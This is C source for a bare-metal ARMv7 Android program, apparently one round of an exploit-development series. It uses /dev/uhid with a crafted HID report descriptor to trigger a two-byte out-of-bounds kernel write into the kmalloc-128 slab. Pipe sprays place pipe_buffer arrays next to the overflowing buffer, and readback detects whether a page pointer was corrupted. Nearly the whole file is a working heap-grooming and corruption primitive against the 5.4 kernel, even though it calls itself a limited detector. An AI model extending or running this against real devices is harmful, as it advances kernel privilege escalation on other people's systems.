/*
 * pipe_spill_r25.c -- Phase 18 Round 25: pipe->bufs kmalloc-128 adjacency detector.
 *
 * Bare-metal armv7a static ELF (no libc, raw svc 0 syscalls).  SAFETY:
 * the feature-report length L is validated to be EXACTLY 129 on every run
 * (=> 2 zero bytes past the 128-byte kmalloc object at indices 128,129).
 * NEVER any larger L.  Only /dev/uhid is opened; only /data/local/tmp is
 * touched via adb push.  No reboot / system / vendor / block writes.
 *
 * ORACLE (confirmed on target 5.4.286 arm64, 32-bit compat shell):
 *   /proc/self/cgroup = 4:memory:/  => shell in ROOT memcg, so
 *   GFP_KERNEL_ACCOUNT (pipe->bufs) and GFP_KERNEL (HID kzalloc(9)) share
 *   the single kmalloc-128 slab (ARCH_DMA_MINALIGN=128, no kmalloc-16/32/64).
 *   struct pipe_buffer (arm64 5.4, 40 B): page@0, offset@8, len@12,
 *   ops@16, flags@24, private@32.  A 2-buffer array = 80 B -> kmalloc-128.
 *   The HID memset(buf+2, 0, L-1) with L=129 writes buf[128] and buf[129]
 *   = low 2 bytes of the NEXT kmalloc-128 object's pipe_buffer[0].page.
 *   If that object is a pipe's bufs array, read() from that pipe returns
 *   data from a different (4 MB-aligned) physical page -> detectable.
 *
 * Build:
 *   clang --target=armv7a-linux-androideabi21 -nostdlib -static -Os \
 *         -o pipe_spill_r25 pipe_spill_r25.c
 * Usage: pipe_spill_r25 <L:129> <npipes> <mode:0|1> [seed]
 *   mode 0 = spray pipes FIRST, then create HID device (HID buf after pipes)
 *   mode 1 = create HID device + GET_REPORT FIRST (reply deferred), then
 *            spray pipes while the HID kzalloc(9) buf is still alive, then reply
 */
#define __NR_exit   1
#define __NR_read   3
#define __NR_write  4
#define __NR_close  6
#define __NR_getpid 20
#define __NR_fcntl  55
#define __NR_poll  168
#define __NR_openat 322
#define __NR_pipe2  359

#define AT_FDCWD   (-100)
#define O_RDWR     2
#define O_NONBLOCK 04000
#define F_SETPIPE_SZ 1031
#define F_GETPIPE_SZ 1032
#define POLLIN     1

typedef unsigned char      u8;
typedef unsigned short     u16;
typedef unsigned int       u32;
typedef unsigned long long u64;

enum {
    UHID_DESTROY=1, UHID_START=2, UHID_STOP=3, UHID_OPEN=4, UHID_CLOSE=5,
    UHID_OUTPUT=6, UHID_GET_REPORT=9, UHID_GET_REPORT_REPLY=10,
    UHID_CREATE2=11, UHID_INPUT2=12, UHID_SET_REPORT=13, UHID_SET_REPORT_REPLY=14,
};
struct uhid_start_req { u64 dev_flags; } __attribute__((packed));
struct uhid_create2_req {
    u8 name[128]; u8 phys[64]; u8 uniq[64];
    u16 rd_size; u16 bus; u32 vendor; u32 product; u32 version; u32 country;
    u8 rd_data[4096];
} __attribute__((packed));
struct uhid_get_report_req { u32 id; u8 rnum; u8 rtype; } __attribute__((packed));
struct uhid_get_report_reply_req {
    u32 id; u16 err; u16 size; u8 data[4096];
} __attribute__((packed));
struct uhid_event {
    u32 type;
    union {
        struct uhid_create2_req create2;
        struct uhid_start_req start;
        struct uhid_get_report_req get_report;
        struct uhid_get_report_reply_req get_report_reply;
    } u;
} __attribute__((packed));
struct pollfd { int fd; short events; short revents; };

/* ---- minimal EABI helpers ---- */
void __aeabi_memcpy(void*d,const void*s,unsigned n)
{volatile u8*x=d;volatile const u8*y=s;while(n--)*x++=*y++;}
void __aeabi_memmove(void*d,const void*s,unsigned n){__aeabi_memcpy(d,s,n);}
void __aeabi_memset(void*d,int c,unsigned n){volatile u8*x=d;while(n--)*x++=(u8)c;}
void __aeabi_memclr(void*d,unsigned n){__aeabi_memset(d,0,n);}

static void zero_(void*p,unsigned n){volatile u8*q=p;while(n--)*q++=0;}
static int slen_(const char*s){volatile const char*p=s;int n=0;while(*p){p++;n++;}return n;}
static long sys1(long n,long a)
{register long r0 asm("r0")=a,r7 asm("r7")=n;asm volatile("svc 0":"+r"(r0):"r"(r7):"memory");return r0;}
static long sys2(long n,long a,long b)
{register long r0 asm("r0")=a,r1 asm("r1")=b,r7 asm("r7")=n;asm volatile("svc 0":"+r"(r0):"r"(r1),"r"(r7):"memory");return r0;}
static long sys3(long n,long a,long b,long c)
{register long r0 asm("r0")=a,r1 asm("r1")=b,r2 asm("r2")=c,r7 asm("r7")=n;asm volatile("svc 0":"+r"(r0):"r"(r1),"r"(r2),"r"(r7):"memory");return r0;}
static long sys4(long n,long a,long b,long c,long d)
{register long r0 asm("r0")=a,r1 asm("r1")=b,r2 asm("r2")=c,r3 asm("r3")=d,r7 asm("r7")=n;asm volatile("svc 0":"+r"(r0):"r"(r1),"r"(r2),"r"(r3),"r"(r7):"memory");return r0;}
static void puts_(const char*s){sys3(__NR_write,1,(long)s,slen_(s));}
static void putc_(char c){sys3(__NR_write,1,(long)&c,1);}
static void putint(long v)
{char b[24];int i=0,neg=0;if(v<0){neg=1;v=-v;}if(!v)b[i++]='0';while(v>0){b[i++]='0'+(v%10);v/=10;}
 if(neg)sys3(__NR_write,1,(long)"-",1);for(int j=i-1;j>=0;j--)putc_(b[j]);}
static void puthex2(u8 v)
{const char*h="0123456789abcdef";putc_(h[(v>>4)&0xf]);putc_(h[v&0xf]);}
static unsigned parse_u(const char*s){unsigned v=0;while(*s>='0'&&*s<='9'){v=v*10+(unsigned)(*s-'0');s++;}return v;}

/* ---- spray state ---- */
#define NPIPES_MAX 400
static int pfds[NPIPES_MAX][2];
static u8 pat[NPIPES_MAX][64];
static u8 rbuf[80];
static int npipes;
static int cur_seed;

static void make_pat(int i,int seed)
{
    pat[i][0]=(u8)(i+1);
    for(int j=1;j<64;j++) pat[i][j]=(u8)(0x40 + ((j*7 + i*13 + seed*29)%90));
}

static int spray_pipes(int n,int seed)
{
    int made=0, sized=0, written=0, size_bad=0;
    npipes=0;
    for(int i=0;i<n;i++){
        long r=sys2(__NR_pipe2,(long)&pfds[i][0],O_NONBLOCK);
        if(r<0){ if(i==0){puts_("  pipe2 FAILED ret=");putint(r);puts_("\n");} continue; }
        made++; npipes++;
        long sz=sys3(__NR_fcntl,pfds[i][1],F_SETPIPE_SZ,8192);
        long g =sys3(__NR_fcntl,pfds[i][1],F_GETPIPE_SZ,0);
        if(sz==8192 && g==8192) sized++; else size_bad++;
        make_pat(i,seed);
        long w=sys3(__NR_write,pfds[i][1],(long)pat[i],64);
        if(w==64) written++;
    }
    puts_("  [spray] pipes made=");putint(made);
    puts_(" sized8192=");putint(sized);
    puts_(" size_bad=");putint(size_bad);
    puts_(" written64=");putint(written);puts_("\n");
    return made;
}

static void dump_bytes(u8*b,int n)
{
    puts_("    hex: ");
    for(int j=0;j<n;j++){puthex2(b[j]);if((j&7)==7)putc_(' ');}
    puts_("\n    asc: ");
    for(int j=0;j<n;j++){u8 c=b[j];putc_((c>=0x20&&c<0x7f)?(char)c:'.');}
    puts_("\n");
}

/* Return 1 if any pipe readback changed. */
static int readback(void)
{
    int got=0,bad_pipes=0,err=0;
    for(int i=0;i<npipes;i++){
        zero_(rbuf,sizeof(rbuf));
        long r=sys3(__NR_read,pfds[i][0],(long)rbuf,64);
        if(r!=64){err++;if(err<=5){puts_("  [read] idx=");putint(i);puts_(" ret=");putint(r);puts_("\n");}continue;}
        got++;
        int bad=0;for(int j=0;j<64;j++) if(rbuf[j]!=pat[i][j]) bad++;
        if(bad){
            bad_pipes++;
            if(bad_pipes<=10){
                puts_("  >>> OOB_CORRUCTION idx=");putint(i);
                puts_(" bad_bytes=");putint(bad);puts_("\n");
                puts_("    want:");dump_bytes(pat[i],16);
                puts_("    got :");dump_bytes(rbuf,16);
            }
        }
    }
    puts_("  [readback] pipes=");putint(npipes);
    puts_(" got64=");putint(got);
    puts_(" err=");putint(err);
    puts_(" CHANGED_PIPES=");putint(bad_pipes);puts_("\n");
    return bad_pipes;
}

/* ---- descriptor: FEATURE report 4 length = L ---- */
static u8 rd[160];
static int rd_len;
static void build_rd(u8 L)
{
    u8*p=rd;
    /* Digitizer / Touch Screen application collection */
    *p++=0x05;*p++=0x0D;*p++=0x09;*p++=0x04;*p++=0xA1;*p++=0x01;
    /* Input report ID 1: ContactID/X/Y -> HID_GROUP_MULTITOUCH */
    *p++=0x85;*p++=0x01;*p++=0x09;*p++=0x22;*p++=0xA1;*p++=0x02;*p++=0x09;*p++=0x51;
    *p++=0x09;*p++=0x30;*p++=0x09;*p++=0x31;*p++=0x15;*p++=0x00;*p++=0x26;*p++=0xFF;
    *p++=0x00;*p++=0x75;*p++=0x08;*p++=0x95;*p++=0x03;*p++=0x81;*p++=0x02;*p++=0xC0;
    /* FEATURE report ID 3: HID_DG_CONTACTMAX (1 byte) -> probe GET_REPORT */
    *p++=0x85;*p++=0x03;*p++=0x09;*p++=0x55;*p++=0x15;*p++=0x00;*p++=0x26;*p++=0xFF;
    *p++=0x00;*p++=0x75;*p++=0x08;*p++=0x95;*p++=0x01;*p++=0xB1;*p++=0x02;
    /* FEATURE report ID 4: L-byte vendor blob (the oversized report) */
    *p++=0x85;*p++=0x04;*p++=0x06;*p++=0x00;*p++=0xFF;*p++=0x09;*p++=0x01;*p++=0x15;
    *p++=0x00;*p++=0x26;*p++=0xFF;*p++=0x00;*p++=0x75;*p++=0x08;*p++=0x95;*p++=L;
    *p++=0xB1;*p++=0x02;
    *p++=0xC0;
    rd_len=(int)(p-rd);
}

/* ---- UHID state ---- */
static int saw_getreport,saw_open,read_errors;
static int defer_reply, stop_on_getreport;
static u32 saved_id; static u8 saved_rnum;

static void send_spill_reply(int fd,u32 id,u8 rnum)
{
    struct uhid_event out; zero_(&out,sizeof(out));
    out.type=UHID_GET_REPORT_REPLY;
    out.u.get_report_reply.id=id;
    out.u.get_report_reply.err=0;
    out.u.get_report_reply.size=2;
    out.u.get_report_reply.data[0]=4;   /* select report 4 -> spill */
    out.u.get_report_reply.data[1]=0;
    puts_("  >>> SPILL REPLY id=");putint(id);puts_(" rnum=");putint(rnum);puts_(" size=2 data[0]=4\n");
    puts_("  reply write ret=");putint(sys3(__NR_write,fd,(long)&out,sizeof(out)));puts_("\n");
}

static void pump(int fd,int rounds)
{
    for(int i=0;i<rounds;i++){
        struct pollfd p;p.fd=fd;p.events=POLLIN;p.revents=0;
        if(sys3(__NR_poll,(long)&p,1,300)<=0)continue;
        struct uhid_event ev; long n=sys3(__NR_read,fd,(long)&ev,sizeof(ev));
        if(n<=0){puts_("  READ ERROR ");putint(n);puts_("\n");read_errors++;return;}
        if(ev.type==UHID_GET_REPORT){
            saw_getreport=1;saved_id=ev.u.get_report.id;saved_rnum=ev.u.get_report.rnum;
            puts_("  EVENT GET_REPORT id=");putint(saved_id);puts_(" rnum=");putint(saved_rnum);puts_("\n");
            if(defer_reply){
                puts_("  [defer] reply withheld (mode 1)\n");
                if(stop_on_getreport)return;
            } else {
                send_spill_reply(fd,saved_id,saved_rnum);
            }
        } else if(ev.type==UHID_OPEN){saw_open=1;puts_("  EVENT OPEN\n");}
        else if(ev.type==UHID_START){puts_("  EVENT START\n");}
        else if(ev.type==UHID_SET_REPORT){
            /* reply to any SET_REPORT with a safe control reply */
            struct uhid_event o;zero_(&o,sizeof(o));
            o.type=UHID_SET_REPORT_REPLY;
            o.u.get_report_reply.id=ev.u.get_report.id;
            o.u.get_report_reply.err=0;
            sys3(__NR_write,fd,(long)&o,sizeof(o));
            puts_("  EVENT SET_REPORT -> safe reply\n");
        }
        else {puts_("  EVENT type=");putint(ev.type);puts_("\n");}
    }
}

__attribute__((naked)) void _start(void){__asm__ volatile("mov r0,sp\n\tb r25_main\n");}
void r25_main(unsigned long*stackp)
{
    int argc=(int)stackp[0]; char**argv=(char**)&stackp[1];
    puts_("=== Phase18 Round25: pipe kmalloc-128 adjacency spill detector ===\n");
    if(argc<4){puts_("usage: pipe_spill_r25 <L:129> <npipes> <mode:0|1> [seed]\n");sys3(__NR_exit,2,0,0);for(;;){}}
    unsigned L=parse_u(argv[1]);
    int n=parse_u(argv[2]);
    int mode=parse_u(argv[3]);
    int seed=(argc>=5)?(int)parse_u(argv[4]):0;
    if(L!=129){puts_("L MUST be 129 (SAFETY)\n");sys3(__NR_exit,2,0,0);for(;;){}}
    if(n<1)n=1;if(n>NPIPES_MAX)n=NPIPES_MAX;
    if(mode!=0&&mode!=1)mode=0;
    cur_seed=seed;
    puts_("pid=");putint(sys1(__NR_getpid,0));puts_("\n");
    puts_("[cfg] L=");putint(L);puts_(" OOB=");putint((long)L-127);
    puts_(" npipes=");putint(n);puts_(" mode=");putint(mode);puts_(" seed=");putint(seed);puts_("\n");

    build_rd((u8)L);
    puts_("[cfg] rd_size=");putint(rd_len);puts_("\n");

    int fd=-1;
    if(mode==0){
        /* pipes first, then HID device */
        puts_("[order] pipes -> HID\n");
        spray_pipes(n,seed);
        fd=sys3(__NR_openat,AT_FDCWD,(long)"/dev/uhid",O_RDWR);
        puts_("open(/dev/uhid) fd=");putint(fd);puts_("\n");
        if(fd<0){sys3(__NR_exit,1,0,0);for(;;){}}
        struct uhid_event ev;zero_(&ev,sizeof(ev));ev.type=UHID_CREATE2;
        {const char*nm="vhid-r25",*ph="uhid/r25",*uq="R25";volatile const char*p;
         for(p=nm;*p;p++)ev.u.create2.name[p-nm]=(u8)*p;
         for(p=ph;*p;p++)ev.u.create2.phys[p-ph]=(u8)*p;
         for(p=uq;*p;p++)ev.u.create2.uniq[p-uq]=(u8)*p;}
        ev.u.create2.rd_size=(u16)rd_len;ev.u.create2.bus=3;
        ev.u.create2.vendor=0x1234;ev.u.create2.product=0x5678;
        ev.u.create2.version=1;ev.u.create2.country=0;
        for(int i=0;i<rd_len;i++)ev.u.create2.rd_data[i]=rd[i];
        puts_("write(CREATE2) ret=");putint(sys3(__NR_write,fd,(long)&ev,sizeof(ev)));puts_("\n");
        pump(fd,16);   /* GET_REPORT -> immediate spill reply -> OPEN */
    } else {
        /* HID device first, defer reply, spray pipes while HID buf alive */
        puts_("[order] HID -> pipes -> reply\n");
        fd=sys3(__NR_openat,AT_FDCWD,(long)"/dev/uhid",O_RDWR);
        puts_("open(/dev/uhid) fd=");putint(fd);puts_("\n");
        if(fd<0){sys3(__NR_exit,1,0,0);for(;;){}}
        struct uhid_event ev;zero_(&ev,sizeof(ev));ev.type=UHID_CREATE2;
        {const char*nm="vhid-r25",*ph="uhid/r25",*uq="R25";volatile const char*p;
         for(p=nm;*p;p++)ev.u.create2.name[p-nm]=(u8)*p;
         for(p=ph;*p;p++)ev.u.create2.phys[p-ph]=(u8)*p;
         for(p=uq;*p;p++)ev.u.create2.uniq[p-uq]=(u8)*p;}
        ev.u.create2.rd_size=(u16)rd_len;ev.u.create2.bus=3;
        ev.u.create2.vendor=0x1234;ev.u.create2.product=0x5678;
        ev.u.create2.version=1;ev.u.create2.country=0;
        for(int i=0;i<rd_len;i++)ev.u.create2.rd_data[i]=rd[i];
        puts_("write(CREATE2) ret=");putint(sys3(__NR_write,fd,(long)&ev,sizeof(ev)));puts_("\n");
        defer_reply=1;stop_on_getreport=1;
        pump(fd,20);   /* capture GET_REPORT, withhold reply */
        stop_on_getreport=0;
        if(!saw_getreport){puts_("  [warn] no GET_REPORT captured before spray\n");}
        puts_("[spray] while HID report buf alive:\n");
        spray_pipes(n,seed);
        defer_reply=0;
        if(saw_getreport)send_spill_reply(fd,saved_id,saved_rnum);
        pump(fd,12);   /* drain OPEN etc. */
    }

    struct uhid_event de;zero_(&de,sizeof(de));de.type=UHID_DESTROY;
    puts_("write(DESTROY) ret=");putint(sys3(__NR_write,fd,(long)&de,sizeof(de)));puts_("\n");
    pump(fd,4);
    sys1(__NR_close,fd);

    puts_("[readback]\n");
    int changed=readback();
    puts_("[result] saw_getreport=");putint(saw_getreport);
    puts_(" saw_open=");putint(saw_open);
    puts_(" read_errors=");putint(read_errors);puts_("\n");
    puts_("[VERDICT] ");puts_(changed?"OOB_CORRUPTION_OBSERVED":"NO_PIPE_CHANGE");puts_("\n");
    if(changed){puts_("  *** STOP further experiments; preserve observation ***\n");}
    /* close pipes */
    for(int i=0;i<npipes;i++){sys1(__NR_close,pfds[i][0]);sys1(__NR_close,pfds[i][1]);}
    puts_("=== done ===\n");
    sys3(__NR_exit,0,0,0);
    for(;;){}
}
